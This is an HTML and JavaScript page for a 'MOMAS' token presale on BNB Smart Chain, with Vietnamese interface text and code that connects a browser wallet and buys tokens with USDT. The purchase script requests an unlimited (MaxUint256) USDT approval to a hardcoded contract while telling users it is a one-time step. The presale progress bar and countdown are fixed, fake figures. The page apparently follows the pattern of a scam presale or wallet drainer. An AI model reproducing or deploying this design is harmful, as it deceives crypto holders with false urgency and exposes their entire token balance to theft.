<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Momas DApp - Universal Wallet Support</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700&display=swap');
        body { background-color: #0b0f1a; color: #f8fafc; font-family: 'Plus Jakarta Sans', sans-serif; overflow-x: hidden; }
        .glass-card { background: rgba(22, 30, 46, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.05); }
        .sidebar-active { transform: translateX(0) !important; }
        .mobile-overlay { background: rgba(0,0,0,0.5); display: none; position: fixed; inset: 0; z-index: 40; }
        input[type="number"]::-webkit-inner-spin-button, input[type="number"]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0; }
    </style>
</head>
<body class="min-h-screen">

    <div id="overlay" class="mobile-overlay md:hidden" onclick="toggleSidebar()"></div>

    <aside id="sidebar" class="fixed left-0 top-0 h-full w-72 bg-[#0f172a] border-r border-slate-800 z-50 p-6 transition-transform -translate-x-full md:translate-x-0">
        <div class="flex items-center justify-between mb-10">
            <div class="flex items-center gap-3">
                <div class="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow-lg shadow-blue-500/30">
                    <i class="fas fa-bolt text-white"></i>
                </div>
                <h1 class="text-2xl font-bold tracking-tight italic">MOMAS</h1>
            </div>
            <button onclick="toggleSidebar()" class="md:hidden text-slate-400"><i class="fas fa-times"></i></button>
        </div>
        <nav class="space-y-2">
            <a href="#" class="flex items-center gap-4 p-3 rounded-xl bg-blue-600/10 text-blue-500 font-bold"><i class="fas fa-th-large w-5"></i> Dashboard</a>
            <a href="#" class="flex items-center gap-4 p-3 rounded-xl text-slate-400 hover:bg-slate-800 transition"><i class="fas fa-coins w-5"></i> Buy Tokens</a>
        </nav>
        <div class="absolute bottom-10 left-6 right-6 p-4 glass-card rounded-2xl">
            <p class="text-xs text-slate-500 mb-1 font-bold uppercase">My Wallet Balance</p>
            <p id="userBalance" class="text-sm font-bold text-blue-400 tracking-wide">0.00 USDT</p>
        </div>
    </aside>

    <div class="md:ml-72 transition-all">
        <header class="p-6 md:px-10 flex justify-between items-center sticky top-0 z-30 bg-[#0b0f1a]/80 backdrop-blur-md">
            <button onclick="toggleSidebar()" class="md:hidden text-2xl"><i class="fas fa-bars text-slate-400"></i></button>
            <div id="networkStatus" class="hidden md:block text-slate-400 text-sm font-semibold italic">Chưa kết nối ví</div>
            
            <div class="flex items-center bg-slate-900 rounded-2xl border border-slate-800 p-1">
                <button id="connectBtn" onclick="connectWallet()" class="bg-blue-600 hover:bg-blue-700 px-6 py-2 rounded-xl font-bold transition shadow-lg shadow-blue-500/20 active:scale-95">
                    Connect Wallet
                </button>
                <button id="logoutBtn" onclick="logout()" class="hidden px-4 text-slate-400 hover:text-red-500 transition border-l border-slate-800 ml-1" title="Đăng xuất">
                    <i class="fas fa-power-off"></i>
                </button>
            </div>
        </header>

        <main class="p-6 md:p-10 max-w-6xl mx-auto">
            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-8">
                <div class="glass-card rounded-3xl p-8 border-t border-white/5">
                    <h3 class="text-slate-400 text-xs font-bold uppercase mb-2">Presale Progress</h3>
                    <div class="text-4xl font-bold mb-6 italic tracking-tight">65,240 <span class="text-lg text-slate-500 font-normal">/ 100,000 USDT</span></div>
                    <div class="w-full bg-slate-900 h-3 rounded-full overflow-hidden border border-slate-800">
                        <div class="bg-gradient-to-r from-blue-600 to-blue-400 h-full w-[65%] rounded-full shadow-[0_0_15px_rgba(59,130,246,0.3)]"></div>
                    </div>
                </div>

                <div class="glass-card rounded-3xl p-8 text-center border border-blue-500/10">
                    <h3 class="text-blue-500 text-[10px] font-bold uppercase tracking-widest mb-6">Ends in</h3>
                    <div class="flex justify-center gap-4">
                        <div class="flex flex-col"><span class="text-3xl font-bold bg-slate-900 w-16 h-16 flex items-center justify-center rounded-2xl mb-1 border border-slate-800">02</span><span class="text-[9px] text-slate-500 font-bold uppercase">Days</span></div>
                        <div class="flex flex-col"><span class="text-3xl font-bold bg-slate-900 w-16 h-16 flex items-center justify-center rounded-2xl mb-1 border border-slate-800">14</span><span class="text-[9px] text-slate-500 font-bold uppercase">Hours</span></div>
                        <div class="flex flex-col"><span class="text-3xl font-bold bg-slate-900 w-16 h-16 flex items-center justify-center rounded-2xl mb-1 border border-slate-800">45</span><span class="text-[9px] text-slate-500 font-bold uppercase">Mins</span></div>
                    </div>
                </div>
            </div>

            <div class="max-w-xl mx-auto">
                <div class="glass-card rounded-[2.5rem] p-8 md:p-10 shadow-2xl border-t border-white/5 relative">
                    <div class="flex justify-between items-center mb-10">
                        <h2 class="text-2xl font-bold italic tracking-tighter uppercase">Purchase MOMAS</h2>
                        <span class="text-[10px] bg-blue-500/10 text-blue-400 px-3 py-1 rounded-full font-bold border border-blue-500/20">1 USDT = 10 MOMAS</span>
                    </div>

                    <div class="space-y-6">
                        <div class="bg-slate-950/50 p-6 rounded-3xl border border-slate-800 focus-within:border-blue-500/50 transition">
                            <label class="text-[10px] text-slate-500 uppercase font-bold mb-2 block">Số lượng nạp</label>
                            <div class="flex items-center">
                                <input type="number" id="usdtAmount" placeholder="0.0" class="bg-transparent text-2xl font-bold w-full outline-none" oninput="calculate()">
                                <div class="flex items-center gap-2 bg-slate-800 px-3 py-1.5 rounded-2xl font-bold text-sm">USDT</div>
                            </div>
                        </div>

                        <div class="bg-slate-950/50 p-6 rounded-3xl border border-slate-800">
                            <label class="text-[10px] text-slate-500 uppercase font-bold mb-2 block">Ước tính nhận</label>
                            <div class="flex items-center">
                                <input type="text" id="tokenReceived" readonly placeholder="0.0" class="bg-transparent text-2xl font-bold w-full outline-none text-blue-400">
                                <div class="flex items-center gap-2 bg-blue-600/10 px-3 py-1.5 rounded-2xl font-bold text-sm text-blue-400">MOMAS</div>
                            </div>
                        </div>

                        <button id="mainBtn" onclick="handleAction()" class="w-full bg-blue-600 hover:bg-blue-700 p-5 rounded-2xl font-bold transition shadow-xl shadow-blue-600/20 text-white active:scale-95 flex items-center justify-center gap-3">
                            <span id="btnText">EXECUTE PURCHASE</span>
                        </button>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <script>
        const SALE_ADDRESS = "0xd3D61008559AcdE3bb6984431E77cA2Fd648aB02";
        const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
        const BSC_CHAIN_ID = "0x38";

        let provider, signer;

        function toggleSidebar() {
            document.getElementById('sidebar').classList.toggle('sidebar-active');
            document.getElementById('overlay').classList.toggle('block');
        }

        // HÀM QUAN TRỌNG: Nhận diện mọi loại ví có trên trình duyệt
        function getWalletProvider() {
            if (window.ethereum) return window.ethereum;
            if (window.web3 && window.web3.currentProvider) return window.web3.currentProvider;
            return null;
        }

        async function verifyNetwork() {
            const eth = getWalletProvider();
            const chainId = await eth.request({ method: 'eth_chainId' });
            if (chainId !== BSC_CHAIN_ID) {
                try {
                    await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }] });
                    return true;
                } catch (e) {
                    if (e.code === 4902) {
                        await eth.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: BSC_CHAIN_ID,
                                chainName: 'BNB Smart Chain',
                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                                rpcUrls: ['https://bsc-dataseed.binance.org/'],
                                blockExplorerUrls: ['https://bscscan.com/']
                            }]
                        });
                        return true;
                    }
                    alert("Vui lòng chuyển sang mạng BNB Smart Chain!");
                    return false;
                }
            }
            return true;
        }

        async function connectWallet() {
            const eth = getWalletProvider();
            if (!eth) return alert("Không tìm thấy ví tiền điện tử! Hãy dùng Trust Wallet, OKX, MetaMask hoặc trình duyệt Web3.");
            
            try {
                const accounts = await eth.request({ method: 'eth_requestAccounts' });
                provider = new ethers.providers.Web3Provider(eth);
                signer = provider.getSigner();
                
                const isNetworkOk = await verifyNetwork();
                if (!isNetworkOk) return;

                updateUI(accounts[0]);
                localStorage.setItem('momas_connected', 'true');
            } catch (err) {
                console.log("User rejected connection");
            }
        }

        async function updateUI(acc) {
            const btn = document.getElementById('connectBtn');
            const status = document.getElementById('networkStatus');
            const balanceLabel = document.getElementById('userBalance');
            const logoutBtn = document.getElementById('logoutBtn');

            if (acc) {
                btn.innerText = acc.slice(0,6) + "..." + acc.slice(-4);
                status.innerHTML = "<span class='text-green-500 font-bold'>● Connected to BSC Network</span>";
                logoutBtn.classList.remove('hidden');
                
                try {
                    const usdt = new ethers.Contract(USDT_ADDRESS, ["function balanceOf(address) view returns (uint256)"], provider);
                    const b = await usdt.balanceOf(acc);
                    balanceLabel.innerText = ethers.utils.formatUnits(b, 18) + " USDT";
                } catch (e) { balanceLabel.innerText = "Error loading balance"; }
            } else {
                btn.innerText = "Connect Wallet";
                status.innerText = "Chưa kết nối ví";
                logoutBtn.classList.add('hidden');
                balanceLabel.innerText = "0.00 USDT";
            }
        }

        function calculate() {
            const val = document.getElementById('usdtAmount').value;
            document.getElementById('tokenReceived').value = val ? (val * 10).toLocaleString() : "0.0";
        }

        function logout() {
            localStorage.setItem('momas_connected', 'false');
            window.location.reload(); // Reload để xóa trắng trạng thái ví
        }

        // LOGIC 1 NÚT BẤM THÔNG MINH - HỖ TRỢ TẤT CẢ VÍ
        async function handleAction() {
            if (!signer) return connectWallet();
            
            const amtValue = document.getElementById('usdtAmount').value;
            if (!amtValue || amtValue <= 0) return alert("Vui lòng nhập số lượng USDT hợp lệ!");

            const amountWei = ethers.utils.parseUnits(amtValue, 18);
            const mainBtn = document.getElementById('mainBtn');

            try {
                mainBtn.disabled = true;
                mainBtn.innerHTML = "<i class='fas fa-circle-notch fa-spin'></i> Đang xử lý...";

                const usdtContract = new ethers.Contract(USDT_ADDRESS, [
                    "function allowance(address,address) view returns (uint256)", 
                    "function approve(address,uint256) returns (bool)"
                ], signer);
                
                const userAddress = await signer.getAddress();
                const currentAllowance = await usdtContract.allowance(userAddress, SALE_ADDRESS);

                // KIỂM TRA QUYỀN (APPROVE) - Chỉ làm 1 lần duy nhất
                if (currentAllowance.lt(amountWei)) {
                    alert("Bước 1: Ủy quyền chi tiêu (Approve) USDT. Bạn chỉ cần thực hiện việc này 1 lần duy nhất trên trang web này.");
                    const txApprove = await usdtContract.approve(SALE_ADDRESS, ethers.constants.MaxUint256);
                    await txApprove.wait();
                    alert("Approve thành công! Hãy thực hiện tiếp Bước 2: Ký xác nhận thanh toán.");
                }

                // THỰC HIỆN MUA (BUY)
                const saleContract = new ethers.Contract(SALE_ADDRESS, ["function buyTokens(uint256) public"], signer);
                const txBuy = await saleContract.buyTokens(amountWei);
                alert("Bước 2: Đang chuyển USDT để nhận MOMAS. Vui lòng chờ xác nhận từ mạng lưới...");
                await txBuy.wait();
                
                alert("Chúc mừng! Giao dịch thành công. Token đã được mua.");
                updateUI(userAddress);
            } catch (err) {
                console.error(err);
                alert("Giao dịch thất bại! Có thể do ví không đủ BNB làm phí gas hoặc bạn đã hủy lệnh.");
            } finally {
                mainBtn.disabled = false;
                mainBtn.innerText = "EXECUTE PURCHASE";
            }
        }

        // Tự động kết nối lại nếu đã từng đăng nhập
        window.addEventListener('load', async () => {
            if (localStorage.getItem('momas_connected') === 'true' && getWalletProvider()) {
                connectWallet();
            }
        });

        // Lắng nghe các sự kiện thay đổi từ ví (OKX, Trust, MetaMask)
        const eth = getWalletProvider();
        if (eth) {
            eth.on('chainChanged', () => window.location.reload());
            eth.on('accountsChanged', (accs) => {
                if (accs.length === 0) logout();
                else connectWallet();
            });
        }
    </script>
</body>
</html>
